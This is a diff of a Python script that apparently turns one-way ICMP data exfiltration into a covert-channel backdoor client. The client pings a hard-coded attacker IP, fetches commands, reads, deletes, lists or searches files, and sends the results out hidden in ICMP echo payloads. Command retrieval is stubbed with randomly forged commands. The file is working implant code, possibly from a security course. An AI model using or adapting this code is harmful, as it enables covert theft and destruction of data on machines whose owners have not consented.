@@ -1,14 +1,24 @@
 import scapy.all as scapy
+import os, fnmatch
+import time
+import random
 
-MAX_DATA_SIZE = 1472
+MAX_DATA_SIZE = 512
+ARE_YOU_CONNECTED_ID = 210
+ASK_FOR_COMMAND_ID = 220
 START_TRANSMISSION_ID = 240
 ONGOING_TRANSMISSION_ID = 250
 END_TRANSMISSION_ID = 255
+FREQUENCY = 60 * 2  # 60s * 2 = 2 minutes
+ATTACKER_IP_ADDR = "192.168.248.231"
+DEFAULT_TIMEOUT = None
+DEFAULT_PAYLOAD = b''
 
 
-def send_ping(ip_addr, id, seq_number, payload):
+def send_ping(ip_addr, id, seq_number, payload, timeout):
     request = scapy.IP(dst=ip_addr) / scapy.ICMP(id=id, seq=seq_number) / payload
     scapy.send(request)
+    return receive_response_packet(request, timeout)
 
 
 def send_data(ip_addr, id, data):
@@ -24,15 +34,26 @@ def send_data(ip_addr, id, data):
                 data_part = bytes_data[-1 * remainder:]
             else:
                 data_part = bytes_data[index * MAX_DATA_SIZE: ((index + 1) * MAX_DATA_SIZE)]
-            send_ping(ip_addr, id, index, data_part)
+            send_ping(ip_addr, id, index, data_part, DEFAULT_TIMEOUT)
     else:
-        send_ping(ip_addr, id, 0x0, bytes_data)
+        send_ping(ip_addr, id, 0x0, bytes_data, DEFAULT_TIMEOUT)
 
 
-def accomplish_transmission(ip_addr, data):
-    send_ping(ip_addr, START_TRANSMISSION_ID, 0x0, b'')
+def ask_for_command(ip_addr):
+    response = send_ping(ip_addr, ASK_FOR_COMMAND_ID, 0x0, DEFAULT_PAYLOAD, DEFAULT_TIMEOUT)
+    return retrieve_command(response)
+
+
+def accomplish_routine(ip_addr):
+    command = ask_for_command(ip_addr)
+    result = do_action(command)
+    send_command_result(ip_addr, result)
+
+
+def send_command_result(ip_addr, data):
+    send_ping(ip_addr, START_TRANSMISSION_ID, 0x0, DEFAULT_PAYLOAD, DEFAULT_TIMEOUT)
     send_data(ip_addr, ONGOING_TRANSMISSION_ID, data)
-    send_ping(ip_addr, END_TRANSMISSION_ID, 0x0, b'')
+    send_ping(ip_addr, END_TRANSMISSION_ID, 0x0, DEFAULT_PAYLOAD, DEFAULT_TIMEOUT)
 
 
 def read_file_content(path):
@@ -43,8 +64,78 @@ def read_file_content(path):
     return data
 
 
+def retrieve_command(response):
+    return forge_random_command().decode("utf-8").split()  # response[scapy.ICMP].payload.load.decode("utf-8").split()
+
+
+def receive_response_packet(request, timeout):
+    return scapy.sniff(lfilter=lambda response: match_response_to_request(response, request), count=1, timeout=timeout)
+
+
+def can_proceed(ip_addr):
+    response = send_ping(ip_addr, ARE_YOU_CONNECTED_ID, 0x0, b'', DEFAULT_TIMEOUT)
+    return True
+
+
+def match_response_to_request(response, request):
+    if response[scapy.ICMP] and response[scapy.ICMP].type == 0 and response[scapy.ICMP].id == request[scapy.ICMP].id \
+            and response[scapy.ICMP].seq == request[scapy.ICMP].seq:
+        return True
+    else:
+        return False
+
+
+def list_directory(path):
+    return ";".join(os.listdir(path))
+
+
+def find(pattern, path):
+    result = []
+    for root, dirs, files in os.walk(path):
+        for name in files:
+            if fnmatch.fnmatch(name, pattern):
+                result.append(os.path.join(root, name))
+    return result
+
+
+def do_action(command):
+    result = ""
+    action = command[0]
+    parameter = command[1]
+
+    if action == "200":
+        print(f"Read file: {parameter}")
+        result = read_file_content(parameter)
+    elif action == "300":
+        print(f"Delete file: {parameter}")
+        os.remove(parameter)
+        result = f"{parameter} removed successfully"
+    elif action == "400":
+        print(f"List path: {parameter}")
+        result = list_directory(parameter)
+    elif action == "500":
+        print(f"Locate filemane: {parameter}")
+        results = find(parameter, './')
+        result = ";".join(results)
+    print(result)
+    return result
+
+
+def forge_random_command():
+    command = b'200 ./data.txt'
+    choice = random.randint(1, 4)
+    if choice == 1:
+        command = b'300 ./data1.txt'
+    elif choice == 2:
+        command = b'400 ./'
+    elif choice == 3:
+        command = b'500 data.txt'
+    return command
+
+
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
-    #print(scapy.conf.L3socket)
-    #scapy.conf.L3socket = scapy.L3RawSocket
-    accomplish_transmission('137.194.150.103', read_file_content('./data.txt'))
+    if can_proceed(ATTACKER_IP_ADDR):
+        accomplish_routine(ATTACKER_IP_ADDR)
+    else:
+        time.sleep(FREQUENCY)
